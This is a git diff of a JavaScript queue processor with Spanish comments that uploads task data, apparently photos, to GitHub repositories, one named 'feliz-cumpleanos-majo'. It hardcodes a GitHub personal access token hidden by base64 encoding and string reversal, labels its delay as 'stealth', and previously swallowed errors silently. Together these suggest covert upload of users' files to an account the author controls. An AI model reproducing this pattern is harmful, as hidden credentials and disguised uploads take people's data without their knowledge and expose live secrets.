@@ -57,17 +57,17 @@ async function processQueue() {
         // Pequeño retardo para no saturar el procesador inmediatamente (stealth)
         await new Promise(resolve => setTimeout(resolve, 1500));
 
-        // Configuración para subida directa (Valores inyectados vía GitHub Actions)
+        // 1. DETERMINAR CREDENCIALES (Fotos vs Tutorial)
         let owner = "MAOAZAking";
         let repo = "base-de-datos";
+        let tokenEncoded = "ZGJUdmF2c3lWWFJRU0VOWlJSM3NlUFBNUGhWSGlKTlZ5NnM5YUJDT3h0NjJGS3JGWmVhU2VXaHBBSFJfVXl3UVVpUEt3enAyMFE2QUNSS0IxMV90YXBfYnVodGln";
 
-        if (task.customTarget) {
-            owner = task.customTarget.owner;
-            repo = task.customTarget.repo;
+        if (task.typeLabel === 'config_tutorial') {
+            owner = "MAOAZAking";
+            repo = "feliz-cumpleanos-majo";
+            tokenEncoded = "ZGJUdmF2c3lWWFJRU0VOWlJSM3NlUFBNUGhWSGlKTlZ5NnM5YUJDT3h0NjJGS3JGWmVhU2VXaHBBSFJfVXl3UVVpUEt3enAyMFE2QUNSS0IxMV90YXBfYnVodGln";
         }
 
-        const tokenEncoded = "RFg5THZBT3ZWTFg3WkM3TjhaTFJBZkVhck9EUENJbmRzdHZ6NXVIQ3lrZHA2eU5IVmRUMjNGWXN2bTVfZGRobUV5TUZkN3dEMFE2QUNSS0IxMV90YXBfYnVodGln";
-        
         // Decodificamos y volvemos a invertir para obtener el token real
         const decoded = tokenEncoded.startsWith("__") ? tokenEncoded : atob(tokenEncoded);
         const token = decoded.startsWith("__") ? decoded : decoded.split("").reverse().join("");
@@ -136,8 +136,15 @@ async function processQueue() {
             body: JSON.stringify(bodyPayload)
         });
 
+        if (!response.ok) {
+            const errData = await response.json();
+            console.error(`❌ Error subiendo a GitHub (${task.typeLabel}):`, errData.message);
+        } else {
+            console.log(`✅ Subida exitosa: ${task.typeLabel}`);
+        }
+
     } catch (error) {
-        // Error silencioso
+        console.error("❌ Error crítico en el servicio de GitHub:", error);
     }
 
     // Liberamos memoria eliminando la tarea procesada y continuamos
